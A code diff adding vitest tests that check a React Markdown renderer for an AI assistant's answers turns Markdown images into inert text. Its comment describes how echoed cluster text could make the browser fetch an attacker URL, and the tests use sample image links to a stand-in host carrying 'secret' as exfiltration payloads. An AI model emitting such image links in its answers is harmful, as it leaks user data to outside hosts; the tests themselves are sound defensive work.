@@ -2,6 +2,37 @@ import { describe, it, expect } from 'vitest'
 import { render } from '@testing-library/react'
 import { MarkdownRenderer } from './MarkdownRenderer'
 
+// A Markdown image in Kobi's answer must not cause a fetch. The answer can echo
+// text the assistant read from the cluster (a log line, an annotation, a
+// connector reply); the browser would load an <img src> on render, with no
+// interaction, so the renderer emits inert text and never an <img>.
+describe('MarkdownRenderer images', () => {
+  it('renders an inline image as inert text, never an <img> element', () => {
+    const { container } = render(
+      <MarkdownRenderer content={'listo ![prueba](http://evil.example/a?d=secret)'} />,
+    )
+    expect(container.querySelector('img')).toBeNull()
+    expect(container.textContent).toContain('prueba')
+    expect(container.textContent).toContain('http://evil.example/a?d=secret')
+  })
+
+  it('renders a reference-style image as inert text too', () => {
+    const { container } = render(
+      <MarkdownRenderer content={'ver ![logo][r]\n\n[r]: http://evil.example/r?d=secret'} />,
+    )
+    expect(container.querySelector('img')).toBeNull()
+    expect(container.textContent).toContain('http://evil.example/r?d=secret')
+  })
+
+  it('does not turn the image URL into a clickable link', () => {
+    const { container } = render(
+      <MarkdownRenderer content={'![x](http://evil.example/p.png)'} />,
+    )
+    const link = container.querySelector('a[href*="evil.example"]')
+    expect(link).toBeNull()
+  })
+})
+
 // Regression pins for the lightweight yaml/bash highlighter. Field-driven:
 // trailing comments (`timeoutSeconds: 3  # era 1`) shipped undimmed in the
 // first pass because only full-line comments were handled.
